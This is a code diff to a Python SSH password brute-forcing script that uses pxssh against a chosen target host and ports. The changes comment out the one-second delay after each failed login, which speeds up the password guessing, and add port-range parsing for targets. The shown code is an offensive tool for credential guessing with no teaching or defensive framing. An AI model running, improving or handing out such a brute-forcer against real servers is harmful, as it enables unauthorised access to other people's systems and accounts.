@@ -21,7 +21,6 @@ def connect(host, user, password):
     global Found
     global Fails
     global ssh_info
-    global connection_lock
 
     try:
         ssh = pxssh.pxssh()
@@ -34,7 +33,7 @@ def connect(host, user, password):
     except pxssh.ExceptionPxssh as e:
         print(f"{Fore.BLUE}[{Fore.YELLOW}-{Fore.BLUE}] {Fore.MAGENTA}Password {Fore.RED}Incorrect {Fore.YELLOW}{password}")
         Fails += 1
-        time.sleep(1)    
+        # time.sleep(1)    
 
 def brute_force_ssh(host):
     global Found
@@ -90,14 +89,22 @@ def main():
     usage = f"[Usage]: {prog} -H <target host> -p <target port>"
     parser = optparse.OptionParser(usage=usage)
     parser.add_option('-H', dest='tgtHost', type='string', \
-            help='specify target host')
+            help='specify target host\'s IP address.')
 
     parser.add_option('-p', dest='tgtPort', type='string', \
-            help='specify target port[s] eparated by comma')
+            help='specify target port[s] eparated by comma. Or put - for range: 21-25.')
     (options, args) = parser.parse_args()
 
     tgtHost = options.tgtHost
-    tgtPorts = str(options.tgtPort).split(',')
+
+    if '-' in options.tgtPort:
+        range_list = options.tgtPort.split('-')
+        ports = ""
+        for i in range(int(range_list[0]), int(range_list[1]) + 1):
+            ports += f"{i}," if i != int(range_list[1]) else f"{i}"
+        tgtPorts = ports.split(',')
+    else:
+        tgtPorts = str(options.tgtPort).split(',')
 
     if tgtHost == None or options.tgtPort == None:
         print(parser.usage)
